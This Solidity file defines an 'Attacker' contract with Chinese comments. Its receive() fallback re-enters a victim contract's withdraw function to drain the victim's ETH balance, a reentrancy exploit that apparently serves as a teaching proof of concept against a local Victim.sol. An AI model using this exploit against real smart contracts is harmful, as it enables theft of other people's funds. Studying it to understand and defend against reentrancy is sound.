// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Victim.sol";

contract Attacker {
    Victim victim;

    // 构造函数，指定受害合约地址
    constructor(address victimAddress) {
        victim = Victim(victimAddress);
    }

    // 攻击函数：向受害合约发送ETH，并执行重入攻击
    function attack() external payable {
        // 先向受害合约存款
        victim.deposit{value: msg.value}();

        // 调用提现函数，触发重入
        victim.withdraw(msg.value);
    }

    // 接受ETH并在收到时触发攻击
    receive() external payable {
        // 重入攻击：再次调用withdraw
        if(address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        }
    }
}